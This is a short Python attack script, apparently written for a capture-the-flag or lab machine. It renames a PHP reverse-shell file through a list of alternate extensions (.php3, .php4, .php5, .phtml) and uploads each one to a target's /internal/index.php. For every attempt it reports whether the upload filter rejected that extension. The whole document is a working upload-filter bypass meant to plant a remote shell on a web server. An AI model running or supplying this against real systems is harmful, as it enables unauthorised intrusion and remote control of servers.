# Quick python script to check allowed upload filetype
# Must have your reverse shell (revshell) file in same directory
# Script renames file with the successful type when complete

import requests
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--port', type=str, required=True)
parser.add_argument('--ip', type=str, required=True)
args = parser.parse_args()

ip = args.ip
port = args.port
url = f"http://{ip}:{port}/internal/index.php"
old_filename = "revshell.php"

filename = "revshell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]


for ext in extensions:

    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)

    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} seems to be allowed!")
    old_filename = new_filename
    
